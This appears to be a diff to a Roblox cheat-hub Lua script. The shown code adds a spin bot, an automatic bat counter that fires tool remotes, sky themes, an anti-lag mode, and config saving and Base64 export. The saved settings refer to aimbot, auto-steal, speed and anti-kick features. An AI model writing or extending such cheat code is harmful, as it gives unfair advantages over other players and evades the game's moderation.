+        if _spBAV then pcall(function() _spBAV:Destroy() end) end
+
+        _spBAV = Instance.new("BodyAngularVelocity")
+        _spBAV.Name = "SpinForce"
+        _spBAV.MaxTorque = Vector3.new(0, math.huge, 0)
+        _spBAV.AngularVelocity = Vector3.new(0, 25, 0)
+        _spBAV.P = 1e5
+        _spBAV.Parent = root
+
+        for _, connection in ipairs(_spMConns) do
+            pcall(function() connection:Disconnect() end)
+        end
+        _spMConns = {}
+
+        local character = root.Parent
+        if character then
+            local function _spOnMedusa(part)
+                if part.Anchored and part.Transparency == 1 then
+                    pcall(function() aceUseMedusaCounter(true) end)
+                    local unanchorConnection
+                    unanchorConnection = part:GetPropertyChangedSignal("Anchored"):Connect(function()
+                        if not part.Anchored then
+                            pcall(function() unanchorConnection:Disconnect() end)
+                            if _spBAV then task.defer(_spStart) end
+                        end
+                    end)
+                    table.insert(_spMConns, unanchorConnection)
+                end
+            end
+
+            for _, part in ipairs(character:GetDescendants()) do
+                if part:IsA("BasePart") then
+                    table.insert(_spMConns, part:GetPropertyChangedSignal("Anchored"):Connect(function()
+                        _spOnMedusa(part)
+                    end))
+                end
+            end
+            table.insert(_spMConns, character.DescendantAdded:Connect(function(part)
+                if part:IsA("BasePart") then
+                    table.insert(_spMConns, part:GetPropertyChangedSignal("Anchored"):Connect(function()
+                        _spOnMedusa(part)
+                    end))
+                end
+            end))
+        end
+    end
+
+    Spin.restart = function()
+        if not Spin.enabled then return end
+        if _spBAV then _spBAV = nil end
+        for _, connection in ipairs(_spMConns) do
+            pcall(function() connection:Disconnect() end)
+        end
+        _spMConns = {}
+        task.defer(_spStart)
+    end
+
+    Spin.start = _spStart
+    Spin.stop = _spStop
+    Spin.setEnabled = function(on)
+        on = on == true
+        Spin.enabled = on
+        if Spin.setVisual then Spin.setVisual(on) end
+        if on then _spStart() else _spStop() end
+    end
+end
+
+batCounterDebounce = false
+BAT_COUNTER_SLAP_LIST = {"Bat", "Slap", "Iron Slap", "Gold Slap", "Diamond Slap", "Emerald Slap", "ZeyHubb Slap", "Dark Matter Slap", "Flame Slap", "Nuclear Slap", "Galaxy Slap", "Glitched Slap"}
+function findBatForCounter()
+    local c = LP.Character
+    if not c then return nil end
+    local bp = LP:FindFirstChildOfClass("Backpack")
+    for _, name in ipairs(BAT_COUNTER_SLAP_LIST) do
+        local t = c:FindFirstChild(name) or (bp and bp:FindFirstChild(name))
+        if t then return t end
+    end
+    for _, ch in ipairs(c:GetChildren()) do
+        if ch:IsA("Tool") and ch.Name:lower():find("bat") then return ch end
+    end
+    if bp then
+        for _, ch in ipairs(bp:GetChildren()) do
+            if ch:IsA("Tool") and ch.Name:lower():find("bat") then return ch end
+        end
+    end
+    return nil
+end
+local function swingBatForCounter(bat, char)
+    local hum2 = char:FindFirstChildOfClass("Humanoid")
+    if bat.Parent ~= char then
+        if hum2 then pcall(function() hum2:EquipTool(bat) end) end; task.wait(0.05)
+    end
+    local remote = bat:FindFirstChildOfClass("RemoteEvent") or bat:FindFirstChildOfClass("RemoteFunction")
+    if remote and remote:IsA("RemoteEvent") then
+        pcall(function() remote:FireServer() end); task.wait(0.8); pcall(function() remote:FireServer() end)
+    else
+        pcall(function() bat:Activate() end); task.wait(0.8); pcall(function() bat:Activate() end)
+    end
+end
+startBatCounter = function()
+    if Conns.batCounter then return end
+    Conns.batCounter = RunService.Heartbeat:Connect(function()
+        if not __HH.batCounterEnabled then return end
+        if batCounterDebounce then return end
+        local char = LP.Character; if not char then return end
+        local hum2 = char:FindFirstChildOfClass("Humanoid"); if not hum2 then return end
+        local st = hum2:GetState()
+        if st == Enum.HumanoidStateType.Physics or st == Enum.HumanoidStateType.Ragdoll or st == Enum.HumanoidStateType.FallingDown then
+            batCounterDebounce = true
+            task.spawn(function()
+                local bat = findBatForCounter()
+                if bat then swingBatForCounter(bat, char) end
+                task.wait(0.5); batCounterDebounce = false
+            end)
+        end
+    end)
+end
+stopBatCounter = function()
+    if Conns.batCounter then Conns.batCounter:Disconnect(); Conns.batCounter = nil end
+    batCounterDebounce = false
+end
+
+end
+do
+local SKY_TAG = "VynxSkyTheme"
+__HH.currentSkyTheme = "Off"
+SKY_PRESETS = {
+    ["Off"]           = {kind="off"},
+    ["Night"]         = {clock=22,brightness=2,ambient={110,100,130},outAmb={120,110,140},sky={stars=4000,moon=18,sun=0,moonTex=true},atm={dens=0.45,color={120,60,180},decay={60,20,100},glare=0.5,haze=1.2}},
+    ["Aurora"]        = {clock=14,brightness=3,ambient={150,120,150},outAmb={160,130,150},atm={dens=0.55,color={255,80,200},decay={255,20,150},glare=2.5,haze=3},clouds={cover=0.7,dens=0.7,color={255,240,250}}},
+    ["Sunset"]        = {clock=17.2,brightness=2.5,ambient={170,120,100},outAmb={180,130,110},sky={stars=0,sun=25,moon=0},atm={dens=0.5,color={255,130,60},decay={255,80,30},glare=2,haze=2.5},clouds={cover=0.55,dens=0.55,color={255,200,140}}},
+    ["Galaxy"]        = {clock=0,brightness=1.5,ambient={70,60,100},outAmb={80,70,110},sky={stars=10000,moon=30,sun=0},atm={dens=0.15,color={40,20,80},decay={20,10,50},glare=0.3,haze=0.5}},
+    ["Cyber"]         = {clock=21,brightness=2.2,ambient={90,130,170},outAmb={100,140,180},sky={stars=2000,moon=12},atm={dens=0.4,color={0,200,255},decay={150,0,255},glare=2,haze=2},clouds={cover=0.4,dens=0.6,color={100,200,255}}},
+    ["Sakura"]        = {clock=11,brightness=3.5,ambient={170,150,160},outAmb={180,160,170},sky={sun=8},atm={dens=0.3,color={255,200,220},decay={255,170,200},glare=1,haze=1.5},clouds={cover=0.6,dens=0.4,color={255,250,252}}},
+    ["Pink Night"]    = {clock=23,brightness=2.2,ambient={120,60,110},outAmb={140,70,120},sky={stars=5000,moon=22,sun=0,moonTex=true},atm={dens=0.5,color={255,80,180},decay={140,30,100},glare=0.7,haze=1.4},clouds={cover=0.3,dens=0.5,color={180,90,150}}},
+    ["Blood Moon"]    = {clock=22.5,brightness=1.6,ambient={130,40,40},outAmb={150,50,50},sky={stars=1500,moon=28,sun=0,moonTex=true},atm={dens=0.6,color={220,30,30},decay={120,10,10},glare=1.4,haze=2},clouds={cover=0.5,dens=0.7,color={120,30,30}}},
+    ["Emerald Dawn"]  = {clock=6.5,brightness=2.8,ambient={130,170,140},outAmb={140,180,150},sky={sun=18,moon=0,stars=0},atm={dens=0.4,color={80,200,140},decay={40,150,90},glare=1.8,haze=2.2},clouds={cover=0.5,dens=0.5,color={200,255,220}}},
+    ["Volcanic"]      = {clock=19,brightness=2,ambient={180,80,40},outAmb={200,90,50},sky={stars=200,sun=12,moon=0},atm={dens=0.75,color={255,60,0},decay={180,20,0},glare=3,haze=3.5},clouds={cover=0.8,dens=0.9,color={120,40,20}}},
+    ["Arctic"]        = {clock=9,brightness=3.2,ambient={200,220,235},outAmb={210,230,245},sky={sun=10,stars=0,moon=0},atm={dens=0.3,color={180,220,255},decay={140,200,240},glare=1.5,haze=1.8},clouds={cover=0.7,dens=0.6,color={250,253,255}}},
+    ["Midnight Ocean"]= {clock=1.5,brightness=1.7,ambient={60,90,130},outAmb={70,100,140},sky={stars=6000,moon=24,sun=0,moonTex=true},atm={dens=0.5,color={20,60,140},decay={10,30,90},glare=0.6,haze=1.5}},
+    ["Vaporwave"]     = {clock=19.5,brightness=2.4,ambient={180,120,200},outAmb={190,130,210},sky={stars=1000,moon=14},atm={dens=0.45,color={255,100,220},decay={120,60,255},glare=2.2,haze=2.4},clouds={cover=0.5,dens=0.55,color={200,150,255}}},
+    ["Toxic"]         = {clock=13,brightness=2.5,ambient={140,180,80},outAmb={150,190,90},atm={dens=0.55,color={100,220,40},decay={60,150,20},glare=1.8,haze=2.6},clouds={cover=0.65,dens=0.7,color={180,255,120}}},
+    ["Solar Eclipse"] = {clock=12,brightness=0.9,ambient={50,40,60},outAmb={60,50,70},sky={stars=3500,sun=22,moon=0},atm={dens=0.5,color={255,140,40},decay={30,20,40},glare=2.8,haze=1.8}},
+    ["Hellscape"]     = {clock=18,brightness=1.8,ambient={200,60,30},outAmb={220,70,40},sky={stars=100,sun=30,moon=0},atm={dens=0.85,color={255,30,0},decay={120,0,0},glare=3.5,haze=4},clouds={cover=0.95,dens=0.95,color={80,20,10}}},
+    ["Heaven"]        = {clock=12,brightness=4,ambient={240,235,210},outAmb={250,245,220},sky={sun=16,moon=0,stars=0},atm={dens=0.25,color={255,250,220},decay={255,240,200},glare=3,haze=1.5},clouds={cover=0.85,dens=0.5,color={255,255,255}}},
+    ["Storm"]         = {clock=15,brightness=1.4,ambient={90,90,110},outAmb={100,100,120},sky={stars=0,sun=6,moon=0},atm={dens=0.65,color={80,90,120},decay={40,50,80},glare=0.5,haze=3},clouds={cover=0.95,dens=0.95,color={60,65,80}}},
+    ["Sunrise"]       = {clock=6.2,brightness=2.8,ambient={220,180,130},outAmb={230,190,140},sky={sun=22,stars=0,moon=0},atm={dens=0.45,color={255,180,100},decay={255,140,80},glare=2.4,haze=2.2},clouds={cover=0.4,dens=0.4,color={255,220,180}}},
+    ["Deep Space"]    = {clock=0,brightness=1,ambient={30,25,50},outAmb={40,35,60},sky={stars=15000,moon=0,sun=0},atm={dens=0.08,color={15,5,40},decay={5,0,20},glare=0.2,haze=0.3}},
+    ["Lavender Dream"]= {clock=18.5,brightness=2.6,ambient={180,160,220},outAmb={190,170,230},sky={stars=800,moon=16,sun=0},atm={dens=0.4,color={200,160,255},decay={160,120,220},glare=1.4,haze=1.8},clouds={cover=0.55,dens=0.5,color={220,200,255}}},
+    ["Inferno"]       = {clock=17.5,brightness=2.2,ambient={220,100,40},outAmb={235,110,50},sky={sun=26,moon=0,stars=0},atm={dens=0.6,color={255,90,20},decay={200,40,0},glare=3,haze=3.2},clouds={cover=0.7,dens=0.7,color={200,80,40}}},
+    ["Mint Sky"]      = {clock=10,brightness=3.2,ambient={180,230,210},outAmb={190,240,220},sky={sun=10},atm={dens=0.32,color={150,255,210},decay={100,220,180},glare=1.6,haze=1.6},clouds={cover=0.55,dens=0.45,color={240,255,250}}},
+}
+local SKY_ORDER = {"Off","Night","Aurora","Sunset","Galaxy","Cyber","Sakura","Pink Night","Blood Moon","Emerald Dawn","Volcanic","Arctic","Midnight Ocean","Vaporwave","Toxic","Solar Eclipse","Hellscape","Heaven","Storm","Sunrise","Deep Space","Lavender Dream","Inferno","Mint Sky"}
+
+local function _color3(rgb) return Color3.fromRGB(rgb[1], rgb[2], rgb[3]) end
+
+local function applySkyTheme(mode)
+    for _, child in ipairs(Lighting:GetChildren()) do
+        if child:GetAttribute(SKY_TAG) then pcall(function() child:Destroy() end) end
+    end
+    local terrain = workspace:FindFirstChildOfClass("Terrain")
+    if terrain then
+        for _, child in ipairs(terrain:GetChildren()) do
+            if child:GetAttribute(SKY_TAG) then pcall(function() child:Destroy() end) end
+        end
+    end
+    local preset = SKY_PRESETS[mode]
+    if not preset or preset.kind == "off" then
+        Lighting.ClockTime = 14; Lighting.Brightness = 2
+        Lighting.OutdoorAmbient = Color3.fromRGB(127,127,127)
+        Lighting.Ambient = Color3.fromRGB(127,127,127)
+        Lighting.FogEnd = 100000; Lighting.GlobalShadows = true
+        __HH.currentSkyTheme = "Off"; return
+    end
+    Lighting.FogStart = 0; Lighting.FogEnd = 100000; Lighting.FogColor = Color3.fromRGB(200,200,200)
+    Lighting.ColorShift_Top = Color3.fromRGB(0,0,0); Lighting.ColorShift_Bottom = Color3.fromRGB(0,0,0)
+    Lighting.GlobalShadows = true; Lighting.ClockTime = preset.clock or 14; Lighting.Brightness = preset.brightness or 2
+    if preset.outAmb then Lighting.OutdoorAmbient = _color3(preset.outAmb) end
+    if preset.ambient then Lighting.Ambient = _color3(preset.ambient) end
+    if preset.sky then
+        local sky = Instance.new("Sky"); sky:SetAttribute(SKY_TAG, true)
+        if preset.sky.stars then sky.StarCount = preset.sky.stars end
+        if preset.sky.moon then sky.MoonAngularSize = preset.sky.moon end
+        if preset.sky.sun then sky.SunAngularSize = preset.sky.sun end
+        if preset.sky.moonTex then sky.MoonTextureId = "rbxasset://sky/moon.jpg" end
+        sky.Parent = Lighting
+    end
+    if preset.atm then
+        local atm = Instance.new("Atmosphere"); atm:SetAttribute(SKY_TAG, true)
+        atm.Density = preset.atm.dens or 0.3; atm.Color = _color3(preset.atm.color)
+        atm.Decay = _color3(preset.atm.decay); atm.Glare = preset.atm.glare or 1; atm.Haze = preset.atm.haze or 1
+        atm.Parent = Lighting
+    end
+    if preset.clouds and terrain then
+        local clouds = Instance.new("Clouds"); clouds:SetAttribute(SKY_TAG, true)
+        clouds.Cover = preset.clouds.cover or 0.5; clouds.Density = preset.clouds.dens or 0.5
+        clouds.Color = _color3(preset.clouds.color); clouds.Parent = terrain
+    end
+    __HH.currentSkyTheme = mode
+end
+
+local defLightBrightness, defLightClock, defLightAmbient
+
+local function applyAntiLagDerender(obj)
+    pcall(function()
+        if obj:IsA("Accessory") or obj:IsA("Hat") then obj:Destroy()
+        elseif obj:IsA("BasePart") then obj.Material = Enum.Material.Plastic; obj.Reflectance = 0; obj.CastShadow = false
+        elseif obj:IsA("Decal") or obj:IsA("Texture") then obj.Transparency = 1
+        elseif obj:IsA("ParticleEmitter") or obj:IsA("Trail") or obj:IsA("Beam") or obj:IsA("Fire") or obj:IsA("Smoke") or obj:IsA("Sparkles") then obj.Enabled = false
+        elseif obj:IsA("AnimationController") or obj:IsA("Animator") then
+            for _,t in ipairs(obj:GetPlayingAnimationTracks()) do pcall(function() t:Stop(0) end) end
+        end
+    end)
+end
+
+local function enableAntiLag()
+    __HH.removeAccessoriesEnabled = true; __HH.antiLagEnabled = true
+    defLightBrightness = defLightBrightness or Lighting.Brightness
+    defLightClock = defLightClock or Lighting.ClockTime
+    defLightAmbient = defLightAmbient or Lighting.OutdoorAmbient
+    Lighting.GlobalShadows = false; Lighting.FogEnd = 1e10; Lighting.Brightness = 1
+    Lighting.EnvironmentDiffuseScale = 0; Lighting.EnvironmentSpecularScale = 0
+    for _, e in pairs(Lighting:GetChildren()) do
+        pcall(function()
+            if e:IsA("BlurEffect") or e:IsA("SunRaysEffect") or e:IsA("ColorCorrectionEffect") or e:IsA("BloomEffect") or e:IsA("DepthOfFieldEffect") then e.Enabled = false end
+        end)
+    end
+    for _, obj in ipairs(workspace:GetDescendants()) do applyAntiLagDerender(obj) end
+    if __HH.antiLagDescConn then __HH.antiLagDescConn:Disconnect() end
+    __HH.antiLagDescConn = workspace.DescendantAdded:Connect(function(obj)
+        if __HH.removeAccessoriesEnabled then applyAntiLagDerender(obj) end
+    end)
+end
+
+local function disableAntiLag()
+    __HH.removeAccessoriesEnabled = false; __HH.antiLagEnabled = false
+    if __HH.antiLagDescConn then __HH.antiLagDescConn:Disconnect(); __HH.antiLagDescConn = nil end
+    pcall(function()
+        if defLightBrightness then Lighting.Brightness = defLightBrightness end
+        if defLightClock then Lighting.ClockTime = defLightClock end
+        if defLightAmbient then Lighting.OutdoorAmbient = defLightAmbient end
+        Lighting.ExposureCompensation = 0
+    end)
+end
+
+local function enableStretchRez()
+    __HH.stretchRezEnabled = true; workspace.CurrentCamera.FieldOfView = 107
+    if __HH.stretchRezConn then __HH.stretchRezConn:Disconnect() end
+    __HH.stretchRezConn = RunService.RenderStepped:Connect(function()
+        if not __HH.stretchRezEnabled then __HH.stretchRezConn:Disconnect(); __HH.stretchRezConn = nil; return end
+        workspace.CurrentCamera.FieldOfView = 107
+    end)
+end
+
+local function disableStretchRez()
+    __HH.stretchRezEnabled = false
+    if __HH.stretchRezConn then __HH.stretchRezConn:Disconnect(); __HH.stretchRezConn = nil end
+    workspace.CurrentCamera.FieldOfView = 70
+end
+
+function saveConfig()
+    local function ks(e) return {kb = e.kb and e.kb.Name or nil, gp = e.gp and e.gp.Name or nil} end
+    local cfg = {
+        normalSpeed = NS, carrySpeed = CS,
+        r3Enabled = (_G.Round3SpeedBooster and _G.Round3SpeedBooster.Enabled) == true,
+        r3NormalSpeed = (_G.Round3SpeedBooster and _G.Round3SpeedBooster.NormalSpeed) or NS,
+        r3CarrySpeed = (_G.Round3SpeedBooster and _G.Round3SpeedBooster.CarrySpeed) or CS,
+        r3ForceCarry = (_G.Round3SpeedBooster and _G.Round3SpeedBooster.ForceCarry) == true,
+        dropBrainrotKey = ks(__HH.KB.DropBrainrot), 
+        tpLockKey = ks(__HH.KB.TPLock), laggerToggleKey = ks(__HH.KB.LaggerToggle),
+        frameResetKey = ks(__HH.KB.InstaReset), frameResetKeyVersion = 1,
+        autoLeftKey = ks(__HH.KB.AutoLeft), autoRightKey = ks(__HH.KB.AutoRight), tpFloorKey = ks(__HH.KB.TPFloor), guiHideKey = ks(__HH.KB.GuiHide),
+        speedToggleKey = ks(__HH.KB.SpeedToggle), batV2Key = ks(__HH.KB.BatV2Toggle),
+        antiRagdoll = __HH.antiRagdollEnabled,
+        infiniteJump = __HH.infJumpEnabled, medusaCounter = __HH.medusaCounterEnabled,
+        medusaReset = __HH.medusaResetEnabled, batCounter = __HH.batCounterEnabled,
+        carryMode = carrySpeedActive, laggerMode = laggerModeEnabled, laggerCarryMode = (laggerModeEnabled and carrySpeedActive),
+        laggerSpeed = LAGGER_SPEED, laggerCarrySpeed = LAGGER_CARRY_SPEED,
+        aimbotV1Speed = aimbotV1Speed,
+        autoCarrySpeedEnabled = autoCarrySpeedEnabled,
+        tpLockEnabled = __HH.tpLockEnabled, autoSwing = autoSwingEnabled,
+        mirrorTPDownEnabled = (_G.PureMirrorTPDown and _G.PureMirrorTPDown.enabled
+            and _G.PureMirrorTPDown.enabled()) == true,
+        batSpamEnabled = (_G.PureBatSpam and _G.PureBatSpam.enabled
+            and _G.PureBatSpam.enabled()) == true,
+        spinBotEnabled = (_G.PureSpinBot and _G.PureSpinBot.enabled) == true,
+        unwalkEnabled = __HH.unwalkEnabled, antiLag = __HH.antiLagEnabled, stretchRez = __HH.stretchRezEnabled,
+        autoTPEnabled = __HH.autoTPEnabled, autoTPHeight = __HH.autoTPHeight,
+        autoJumpBrainrot = __HH.autoJumpBrainrot,
+        floatEnabled = __HH.floatEnabled, floatHeight = __HH.floatHeight,
+        guiTransparencyEnabled = __HH.guiTransparencyEnabled,
+        mobileButtonsEnabled = __HH.mobileButtonsEnabled, mobileButtonsSize = __HH.mobileButtonsSize,
+        circleButtonsEnabled = __HH.circleButtonsEnabled, shapeButtonsEnabled = __HH.shapeButtonsEnabled,
+        rectangularButtonsEnabled = __HH.rectangularButtonsEnabled,
+        infJumpMode = __HH.infJumpMode,
+        antiDie = __HH.antiDieEnabled, autoResetOnDeath = __HH.autoResetOnDeath,
+        uiLocked = __HH.uiLocked, perButtonDragEnabled = __HH.perButtonDragEnabled,
+        batV2Enabled = __HH.batV2Enabled,
+        batAimMode = batAimMode,
+        skyTheme = __HH.currentSkyTheme, uiScale = uiScaleValue,
+        buttonVisibility = __HH.buttonVisibility,
+        espEnabled = __HH.espEnabled,
+        headlessEnabled = __HH.headlessEnabled,
+        korbloxEnabled = __HH.korbloxEnabled,
+        accessoryPack = currentAccessoryPack,
+        autoLeftEnabled = autoLeftEnabled,
+        autoRightEnabled = autoRightEnabled,
+        antiKick = antiKickEnabled,
+        safeMode = antiKickEnabled,
+        aceAnimationPack = __HH.aceSelectedAnimationPack,
+        -- v17 integrated feature state
+        autoStealEnabled = (_G.HorizonStealModes and _G.HorizonStealModes.GetEnabled and _G.HorizonStealModes.GetEnabled()) == true,
+        autoStealMode = (_G.HorizonStealModes and _G.HorizonStealModes.GetMode and _G.HorizonStealModes.GetMode()) or "Instant",
+        autoStealRadius = (_G.HorizonStealModes and _G.HorizonStealModes.GetRadius and _G.HorizonStealModes.GetRadius()) or 61,
+        bodyLockEnabled = __HH.bodyLockEnabled == true,
+        bodyLockRange = __HH.bodyLockRange or 20,
+        antiFlingEnabled = __HH.antiFlingEnabled == true,
+        selectedDevice = __HH.selectedDevice,
+    }
+    pcall(function() writefile("VynxPC.json", __HH.HS:JSONEncode(cfg)) end)
+    return cfg
+end
+
+-- Build the exact same settings table saveConfig() writes to disk, without
+-- touching the file. Used by "Copy Config" so the exported code always
+-- matches what would be auto-saved.
+function __HH.buildConfigTable()
+    return saveConfig()
+end
+
+-- Copy Config / Load Config: turns the full settings table into a single
+-- portable text code (JSON + Base64) and back. Base64 keeps it safe to
+-- paste anywhere; JSON round-trips every field exactly so Load Config
+-- restores settings identically ("نفسها بالظبط").
+-- Implemented as plain Lua (no HttpService:Base64Encode/Decode, which does
+-- not exist on Roblox's HttpService and was silently failing before).
+local B64_CHARS = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"
+local function base64Encode(data)
+    local out = {}
+    local len = #data
+    local i = 1
+    while i <= len do
+        local b1, b2, b3 = data:byte(i, i + 2)
+        b2 = b2 or 0
+        b3 = b3 or 0
+        local n = b1 * 65536 + b2 * 256 + b3
+        local c1 = math.floor(n / 262144) % 64
+        local c2 = math.floor(n / 4096) % 64
+        local c3 = math.floor(n / 64) % 64
+        local c4 = n % 64
+        local rem = len - i + 1
+        out[#out + 1] = B64_CHARS:sub(c1 + 1, c1 + 1)
+        out[#out + 1] = B64_CHARS:sub(c2 + 1, c2 + 1)
+        out[#out + 1] = (rem >= 2) and B64_CHARS:sub(c3 + 1, c3 + 1) or "="
+        out[#out + 1] = (rem >= 3) and B64_CHARS:sub(c4 + 1, c4 + 1) or "="
+        i = i + 3
+    end
+    return table.concat(out)
+end
+
+local B64_LOOKUP = {}
+for idx = 1, #B64_CHARS do
+    B64_LOOKUP[B64_CHARS:sub(idx, idx)] = idx - 1
+end
+
+local function base64Decode(data)
+    data = data:gsub("[^" .. B64_CHARS .. "=]", "")
+    local out = {}
+    local i = 1
+    local len = #data
+    while i <= len do
+        local c1 = data:sub(i, i)
+        local c2 = data:sub(i + 1, i + 1)
+        local c3 = data:sub(i + 2, i + 2)
+        local c4 = data:sub(i + 3, i + 3)
+        local n1 = B64_LOOKUP[c1]
+        local n2 = B64_LOOKUP[c2]
+        if not n1 or not n2 then break end
+        local n3 = (c3 ~= "=" and c3 ~= "") and B64_LOOKUP[c3] or nil
+        local n4 = (c4 ~= "=" and c4 ~= "") and B64_LOOKUP[c4] or nil
+        local n = n1 * 262144 + n2 * 4096 + (n3 or 0) * 64 + (n4 or 0)
+        local byte1 = math.floor(n / 65536) % 256
+        local byte2 = math.floor(n / 256) % 256
+        local byte3 = n % 256
+        out[#out + 1] = string.char(byte1)
+        if n3 then out[#out + 1] = string.char(byte2) end
+        if n4 then out[#out + 1] = string.char(byte3) end
+        i = i + 4
+    end
+    return table.concat(out)
+end
+
+local CONFIG_CODE_PREFIX = "HZNV2-"
+function __HH.encodeConfigCode(cfg)
+    local json = __HH.HS:JSONEncode(cfg)
+    local b64 = base64Encode(json)
+    return CONFIG_CODE_PREFIX .. b64
+end
+
+function __HH.decodeConfigCode(code)
+    if type(code) ~= "string" then return nil end
+    code = code:gsub("^%s+", ""):gsub("%s+$", "")
+    if code == "" then return nil end
+    local body = code
+    if code:sub(1, #CONFIG_CODE_PREFIX) == CONFIG_CODE_PREFIX then
+        body = code:sub(#CONFIG_CODE_PREFIX + 1)
+    end
+    local okB64, json = pcall(base64Decode, body)
+    if not okB64 or type(json) ~= "string" or json == "" then return nil end
+    local okJson, cfg = pcall(function() return __HH.HS:JSONDecode(json) end)
+    if not okJson or type(cfg) ~= "table" then return nil end
+    return cfg
+end
+
+task.spawn(function() while task.wait(5) do saveConfig() end end)
+
+
+local overheadGui = nil
+local overheadSpeedLabel = nil
+
+local function createHeadLabels(char)
+    if overheadGui then
+        pcall(function() overheadGui:Destroy() end)
+        overheadGui = nil
+        overheadSpeedLabel = nil
+    end
+    if not char then return end
+    local head = char:FindFirstChild("Head") or char:WaitForChild("Head", 5)
+    if not head then return end
+    
+    overheadGui = Instance.new("BillboardGui")
+    overheadGui.Name = "yousef_duels_OverheadInfo"
+    overheadGui.Size = UDim2.new(0, 250, 0, 100)
+    overheadGui.StudsOffset = Vector3.new(0, 3, 0)
+    overheadGui.AlwaysOnTop = true
+    overheadGui.LightInfluence = 0
+    overheadGui.Parent = head
+    
+
+    
+    -- Discord Link (Middle)
+    local discordLbl = Instance.new("TextLabel")
+    discordLbl.Name = "Discord"
+    discordLbl.Size = UDim2.new(1, 0, 0, 26)
+    discordLbl.Position = UDim2.new(0, 0, 0, 26)
+    discordLbl.BackgroundTransparency = 1
+    discordLbl.Text = "discord.gg/VMB5ywPY7"
+    discordLbl.TextColor3 = Color3.fromRGB(205, 232, 255)
+    discordLbl.TextStrokeColor3 = Color3.fromRGB(0, 0, 0)
+    discordLbl.TextStrokeTransparency = 0
+    discordLbl.Font = Enum.Font.GothamBold
+    discordLbl.TextSize = 14
+    discordLbl.TextXAlignment = Enum.TextXAlignment.Center
+    discordLbl.ZIndex = 10
+    discordLbl.Parent = overheadGui
+    
+    -- Speed (Bottom)
+    overheadSpeedLabel = Instance.new("TextLabel")
+    overheadSpeedLabel.Name = "Speed"
+    overheadSpeedLabel.Size = UDim2.new(1, 0, 0, 26)
+    overheadSpeedLabel.Position = UDim2.new(0, 0, 0, 52)
+    overheadSpeedLabel.BackgroundTransparency = 1
+    overheadSpeedLabel.Text = "Speed: 0"
+    overheadSpeedLabel.TextColor3 = Color3.fromRGB(205, 232, 255)
+    overheadSpeedLabel.TextStrokeColor3 = Color3.fromRGB(0, 0, 0)
+    overheadSpeedLabel.TextStrokeTransparency = 0
+    overheadSpeedLabel.Font = Enum.Font.GothamBold
+    overheadSpeedLabel.TextSize = 16
+    overheadSpeedLabel.TextXAlignment = Enum.TextXAlignment.Center
+    overheadSpeedLabel.ZIndex = 10
+    overheadSpeedLabel.Parent = overheadGui
+    
+    local conn
+    conn = RunService.RenderStepped:Connect(function()
+        if not char or not char.Parent or not overheadSpeedLabel then conn:Disconnect(); return end
+        local hrp = char:FindFirstChild("HumanoidRootPart")
+        local hum = char:FindFirstChildOfClass("Humanoid")
+        if hum and hrp then
+            local md = hum.MoveDirection
+            if md.Magnitude > 0.1 then
+                -- player is moving: show the configured speed (stable)
+                overheadSpeedLabel.Text = "Speed: " .. tostring(getActiveMoveSpeed())
+            else
+                overheadSpeedLabel.Text = "Speed: 0"
+            end
+        end
+
+    end)
+end
+
+LP.CharacterAdded:Connect(function(char)
+    task.wait(0.5)
+    createHeadLabels(char)
+end)
+
+if LP.Character then
+    task.spawn(function()
+        task.wait(0.5)
+        createHeadLabels(LP.Character)
+    end)
+end
+
+-- Clean Hub ragdoll countdown (billboard over head), recolored blue.
+do
+    local _ragCountdownRunning = false
+    local function _getRagBillboard()
+        local char = LP.Character
+        if not char then return nil, nil end
+        local head = char:FindFirstChild("Head")
+        if not head then return nil, nil end
+        local cGui = game:GetService("CoreGui")
+        local pGui = LP:WaitForChild("PlayerGui")
+        local existing = cGui:FindFirstChild("RagCountdownBillboard")
+        if existing then existing:Destroy() end
+        local existing2 = pGui:FindFirstChild("RagCountdownBillboard")
+        if existing2 then existing2:Destroy() end
+        local bb = Instance.new("BillboardGui")
+        bb.Name = "RagCountdownBillboard"
+        bb.Size = UDim2.new(0, 84, 0, 42)
+        bb.StudsOffset = Vector3.new(0, 4.5, 0)
+        bb.AlwaysOnTop = true
+        bb.Adornee = head
+        if not pcall(function() bb.Parent = cGui end) then
+            bb.Parent = pGui
+        end
+        local lbl = Instance.new("TextLabel")
+        lbl.Size = UDim2.new(1, 0, 1, 0)
+        lbl.AnchorPoint = Vector2.new(0.5, 0.5)
+        lbl.Position = UDim2.new(0.5, 0, 0.5, 0)
+        lbl.BackgroundTransparency = 1
+        lbl.Font = Enum.Font.GothamBlack
+        lbl.TextScaled = true
+        lbl.TextColor3 = Color3.fromRGB(100, 205, 255)
+        lbl.TextStrokeColor3 = Color3.fromRGB(0, 20, 50)
+        lbl.TextStrokeTransparency = 0
+        lbl.Text = ""
+        lbl.Parent = bb
+        return bb, lbl
+    end
+    local function _ragPunch(lbl, text)
+        if not (lbl and lbl.Parent) then return end
+        lbl.Text = text
+    end
+    local function _startRagCountdown()
+        if _ragCountdownRunning then return end
+        _ragCountdownRunning = true
+        task.spawn(function()
+            local bb, lbl = _getRagBillboard()
+            if not bb then _ragCountdownRunning = false; return end
+            local timeLeft = 2.5
+            local step = 0.1
+            while timeLeft > 0 and bb.Parent do
+                _ragPunch(lbl, string.format("%.1f", timeLeft))
+                task.wait(step)
+                timeLeft = timeLeft - step
+            end
+            if bb and bb.Parent then
+                _ragPunch(lbl, "READY!")
+                task.wait(0.5)
+                if bb and bb.Parent then bb:Destroy() end
+            end
+            _ragCountdownRunning = false
+        end)
+    end
+    local _wasRagdolled = false
+    RunService.Heartbeat:Connect(function()
+        local char = LP.Character
+        if not char then _wasRagdolled = false; return end
+        local hum = char:FindFirstChildOfClass("Humanoid")
+        if not hum or hum.Health <= 0 then _wasRagdolled = false; return end
+        local st = hum:GetState()
+        local inRag = st == Enum.HumanoidStateType.Physics or st == Enum.HumanoidStateType.Ragdoll or st == Enum.HumanoidStateType.FallingDown
+        if inRag and not _wasRagdolled then
+            _wasRagdolled = true
+            _startRagCountdown()
+        elseif not inRag then
+            _wasRagdolled = false
+        end
+    end)
+end
+
+-- AIM BOT carry handoff:
+-- when the internal or floating AIM BOT button is ON during carry animation
+-- 71186871415348, disable AIM BOT first and run Pure's DROP BR. AIM BOT stays
+-- disabled until the drop motion is finished, the carry animation is gone, and
+-- any carry state detected at the start is cleared for stable consecutive frames.
+-- If confirmation fails, DROP BR retries while AIM BOT remains disabled; only a
+-- confirmed drop restores it. Anti Kick never cancels this cycle.
+_G.PureDropThenAimCycleActive = false
+_G.PureDropThenAimSafeModeAuthorized = false
+do
